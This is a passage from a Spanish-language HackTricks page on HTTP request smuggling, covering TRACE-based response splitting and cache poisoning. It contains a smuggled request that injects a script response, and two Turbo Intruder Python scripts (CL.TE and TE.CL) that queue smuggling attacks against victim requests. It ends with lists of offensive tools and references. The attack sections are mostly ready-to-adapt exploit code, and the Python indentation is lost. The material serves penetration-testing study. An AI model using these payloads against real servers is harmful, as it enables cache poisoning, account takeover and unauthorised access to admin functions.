### Abusando de TRACE a trav√©s de la divisi√≥n de respuestas HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuar siguiendo [**esta publicaci√≥n**](https://portswigger.net/research/trace-desync-attack) se sugiere como otra forma de abusar del m√©todo TRACE. Como se coment√≥, contrabandear una solicitud HEAD y una solicitud TRACE es posible **controlar algunos datos reflejados** en la respuesta a la solicitud HEAD. La longitud del cuerpo de la solicitud HEAD est√° b√°sicamente indicada en el encabezado Content-Length y se forma por la respuesta a la solicitud TRACE.

Por lo tanto, la nueva idea ser√≠a que, sabiendo este Content-Length y los datos dados en la respuesta TRACE, es posible hacer que la respuesta TRACE contenga una respuesta HTTP v√°lida despu√©s del √∫ltimo byte del Content-Length, permitiendo a un atacante controlar completamente la solicitud a la siguiente respuesta (que podr√≠a ser utilizada para realizar un envenenamiento de cach√©).

Ejemplo:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Generar√° estas respuestas (note c√≥mo la respuesta HEAD tiene un Content-Length que hace que la respuesta TRACE sea parte del cuerpo de HEAD y una vez que termina el Content-Length de HEAD, se infiltra una respuesta HTTP v√°lida):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### Arma de HTTP Request Smuggling con Desincronizaci√≥n de Respuestas HTTP

¬øHas encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes c√≥mo explotarla? Prueba este otro m√©todo de explotaci√≥n:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Otras T√©cnicas de HTTP Request Smuggling

* HTTP Request Smuggling en el Navegador (Lado del Cliente)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling en Downgrades de HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gram√°tica √∫til para encontrar discrepancias extra√±as en el request smuggling.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}
